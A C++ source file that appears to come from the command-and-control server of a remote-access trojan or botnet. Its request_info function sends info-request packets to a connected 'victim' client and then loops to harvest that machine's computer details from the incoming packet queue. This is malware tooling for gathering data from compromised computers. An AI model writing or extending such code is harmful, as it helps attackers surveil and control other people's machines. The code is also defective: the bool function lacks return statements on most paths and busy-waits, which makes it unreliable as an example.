#include "..\Library\precompile.h"
#include "..\Library\tcp_server.h"

bool tcp_server::request_info(client& victim, bool request)
{
	// Requesting 
	if (request) {

		//Since this info does not update too often this makes sure that it will only update if the values are empty

		if (!std::all_of(victim.computer_info.begin(), victim.computer_info.end(), [&](std::pair<std::string, std::string> const& i) {return victim.computer_info.begin()->second == i.second; })) {
			return false;
		}

		console << "[~] Requesting information from " << victim.name << "\n";

		for (auto keyval : victim.computer_info) {
			tcp_server::send(victim, keyval.first, "Info Request");
		}
	}

	// Fetching the values

	else {

		// Things to fetch

		std::vector<std::string> items_fetch;

		std::transform(victim.computer_info.begin(), victim.computer_info.end(), std::back_inserter(items_fetch), [](auto const& pair) {return pair.first; });

		while (std::find(client_list.begin(), client_list.end(), victim) != client_list.end()) {

			// If packet_queue is not empty

			if (!victim.packet_queue.empty()) {
				for (auto item : items_fetch) {
					
					auto search = std::find_if(victim.packet_queue.begin(), victim.packet_queue.end(),
						[&](packet pak) {
							return pak.identifier_buffer == "Info | " + item;
						});

					if (search != victim.packet_queue.end()) {
						victim.computer_info[item] = search->data_buffer;
						victim.packet_queue.erase(std::remove(victim.packet_queue.begin(), victim.packet_queue.end(), *search), victim.packet_queue.end());
					}

				}
			}
		}
	}
}